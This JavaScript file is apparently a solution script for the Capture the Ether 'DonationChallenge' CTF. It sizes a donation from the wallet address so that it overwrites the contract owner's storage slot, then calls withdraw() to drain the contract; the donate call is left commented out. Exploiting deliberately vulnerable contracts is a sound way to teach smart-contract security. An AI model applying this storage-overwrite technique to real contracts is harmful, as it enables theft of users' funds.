/*
 * @Author: Soingjeang
 * @Date: 2022-07-25 18:57:14
 * @LastEditors: SoingJeang
 * @LastEditTime: 2022-07-26 14:57:37
 * @FilePath: \CapTheEther\src\math\3_5_DonationChallenge.js
 */
/*
 * @Author: Soingjeang
 * @Date: 2022-07-21 14:49:07
 * @LastEditors: SoingJeang
 * @LastEditTime: 2022-07-26 11:04:15
 * @FilePath: \CapTheEther\src\captureModel.js
 */
const ethers = require('ethers');
const fs = require('fs');
const utils = require('../utils')
const abiFile = './build/contracts/DonationChallenge.json'; // fill
const ctfAbi = './build/contracts/DonationChallenge.json'; // fill
const secrteFile = "../.secret"
const mnemonicFile = "../iBpnG3uuUwI.csv"
const ctfaddress = "0xaF49c1C70dA5fAEF1DB2eD63Af721d543Ef8C05A" // fill
const contractChallangeAddress = "0xaF49c1C70dA5fAEF1DB2eD63Af721d543Ef8C05A" // fill
const localChallange = "0xaF49c1C70dA5fAEF1DB2eD63Af721d543Ef8C05A" //fill
const localctf = "0xaF49c1C70dA5fAEF1DB2eD63Af721d543Ef8C05A" //fill

var localtest = 0  //fill 

let provider = utils.getNetProvider("3", localtest)


async function guess(contractCtf, contractChallenge, wallet) {
    comp = await contractChallenge.isComplete()
    console.log("complete: " + comp)
    if (!comp) {
        if(localtest){
            owner = await contractCtf.getOwner()
            console.log("begin: " + owner)
            let amalist = ethers.BigNumber.from(owner)
            console.log("as value: " + amalist)

            if (owner === wallet.address){
                console.log("success going to withdraw")
            }
        }
        
        let amoutString = ethers.BigNumber.from(wallet.address)
        console.log("my address: " + wallet.address)
        // this value must equal owner address is going to store
        let initten = ethers.BigNumber.from(10)
        let etherDiv = initten.pow(36)
        let etherAmout = amoutString.mul(1)
        let etherValue = etherAmout.div(etherDiv)
        console.log("value: " + etherValue + "  amout: " + etherAmout)
        
        // check = await contractCtf.donate(etherAmout, {value:etherValue})
        withdraw = await contractChallenge.withdraw()
    }
    
    comp = await contractChallenge.isComplete()
    console.log("complete: " + comp)
    console.log("uess me done")
}

async function doCapture() {

    let wallet = utils.getMnemonicWallet(mnemonicFile, localtest)

    var contractChall
    var contrateCtf
    if (localtest) {
        contractChall = utils.getContract(wallet, abiFile, localChallange, provider)
        contrateCtf = utils.getContract(wallet, ctfAbi, localctf, provider)
    }
    else {
        contractChall = utils.getContract(wallet, abiFile, contractChallangeAddress, provider)
        contrateCtf = utils.getContract(wallet, ctfAbi, ctfaddress, provider)
    }
    
    // console.log(contract)
    
    guess(contrateCtf, contractChall, wallet)
}

doCapture()

